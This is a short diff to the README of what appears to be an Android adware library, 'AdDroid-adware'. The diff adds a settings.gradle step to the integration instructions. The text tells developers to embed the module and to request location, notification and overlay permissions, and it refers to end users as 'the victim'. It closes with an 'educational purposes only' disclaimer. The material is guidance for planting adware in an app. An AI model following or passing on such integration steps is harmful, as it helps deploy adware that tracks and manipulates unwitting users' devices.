@@ -11,6 +11,10 @@ For `build.gradle.kts`:
 ```
 implementation(project(":AdDroid-adware"))
 ```
+Also add this in `settings.gradle`:
+```
+include ':AdDroid-adware'
+```
 Optionally, your app should request location, notification and display over other apps permissions. If you do not request these permissions, the victim will have to manually grant them from the app info.
 
 **For educational purposes only. Do not use for illegal purposes.**
